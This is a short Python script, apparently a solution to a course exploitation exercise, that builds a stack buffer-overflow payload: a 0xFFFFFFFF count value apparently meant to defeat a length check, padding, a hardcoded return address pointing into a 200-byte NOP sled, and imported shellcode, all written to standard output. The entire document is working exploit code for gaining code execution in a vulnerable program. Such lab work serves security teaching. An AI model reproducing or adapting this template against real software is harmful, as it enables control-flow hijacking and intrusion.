import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
count =  pack('<I',0xFFFFFFFF)
nop_addr = pack('<I', 0xfff6ef38+50)
padding = b'\x02' * 44
slide = b'\x90' * 200

payload = count + padding + nop_addr +  slide + shellcode

# Launch the attack!
sys.stdout.buffer.write(payload)
